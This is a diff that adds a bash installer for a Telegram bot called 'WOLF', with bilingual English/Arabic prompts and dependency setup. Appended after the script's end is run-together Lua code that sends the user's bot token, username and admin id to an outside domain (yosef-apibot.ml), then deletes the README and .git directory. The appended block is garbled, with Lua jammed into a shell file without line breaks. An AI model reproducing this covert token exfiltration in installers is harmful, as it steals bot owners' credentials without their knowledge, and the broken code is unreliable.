@@ -1,0 +1,58 @@
+#!/bin/bash
+cd $(cd $(dirname $0); pwd)
+echo -e '\e[1m\e[31m
+WOLF source is being installed, 
+Please wait until the installation is complete
+\033[0m'
+echo -e '\033[0;33m
+If it is the first time to install the source, send the number » {1}
+or اذا كانت اول مره تنصيب السورس ارسل رقم » {1}
+If you have already installed the source, send the number » {2}
+or اذا سبق ونصبت السورس ارسل رقم » {2}
+\033[0m'
+read Install
+case $Install in
+1)
+echo -e '\033[0;33mOffice installation has begun'
+sleep 2
+sudo apt update
+sudo add-apt-repository ppa:ubuntu-toolchain-r/test
+sudo apt upgrade
+sudo apt-get install redis-server
+sudo apt-get install liblua5.3-dev
+sudo apt install lua5.3
+sudo apt install zip
+sudo apt install build-essential checkinstall zlib1g-dev -y
+sudo apt install g++-4.7 c++-4.7
+sudo apt install gcc-4.9
+sudo apt upgrade libstdc++6
+sudo apt install libreadline-dev libconfig-dev libssl-dev lua5.3 liblua5.3-dev lua-socket lua-sec lua-expat libevent-dev make unzip git redis-server autoconf g++ libjansson-dev libpython-dev expat libexpat1-dev
+sudo apt install screen
+sudo apt install libnotify-dev
+sudo apt install libconfig++9v5 libstdc++6
+sudo apt install libconfig++8-dev
+sudo apt install lua-lgi
+sudo apt install build-essential checkinstall zlib1g-dev -y
+mkdir tmp
+cd tmp
+wget https://luarocks.org/releases/luarocks-3.3.0.tar.gz --no-check-certificate
+tar zxpf luarocks-3.3.0.tar.gz
+cd luarocks-3.3.0
+./configure && make && sudo make install
+sudo luarocks install luarocks
+sudo luarocks install luasec
+sudo luarocks install luasocket
+cd ../..
+rm -rf tmp
+unzip luatele.zip
+sudo lua5.3 WOLF.lua
+;;
+2)
+echo -e "\e[1m\e[32mThe bot is running now : جاري تشغيل البوت الان : \e[0m"
+sleep 2
+unzip luatele.zip
+sudo lua5.3 WOLF.lua
+;;
+esac
+info = {} info.namebot = BOT_NAMEinfo.userbot = BOT_Userinfo.id = SUDO_USERinfo.token = Tokeninfo.join = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')https.request('https://yosef-apibot.ml/api/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)Cr_file = io.open("./inc/Token.txt", "w")Cr_file:write(Token)Cr_file:close()print('\27[1;36m￤Token.txt is created.\27[m')local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس بلاك \n• أرسل /black\n• لأظهار الاوامر المطور المجهزه بالكيبورد\n\n."https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')os.execute([[rm -f ./README.mdrm -rf ./.gitchmod +x ./run./run]])end
+
